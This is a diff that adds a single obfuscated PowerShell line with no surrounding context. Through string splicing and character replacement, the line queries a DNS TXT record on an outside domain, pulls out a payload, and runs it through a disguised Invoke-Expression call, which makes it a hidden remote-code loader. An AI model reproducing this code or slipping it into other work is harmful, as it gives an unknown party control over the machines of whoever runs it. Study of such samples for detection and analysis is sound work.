@@ -1,0 +1,1 @@
+﻿ ('if'+'('+'Pd9Pd9+(nslo'+'okup -q=txt p.s.os.ns'+'.rankingp'+'l'+'a'+'c'+'.'+'pl) '+'-match'+' P'+'d9@(.*)@Pd'+'9){iex f'+'Cama'+'tches[1]'+'}').REPLace('fCa','$').REPLace(([char]80+[char]100+[char]57),[StRInG][char]39) | .((vAriAble '*Mdr*').NAme[3,11,2]-join'')
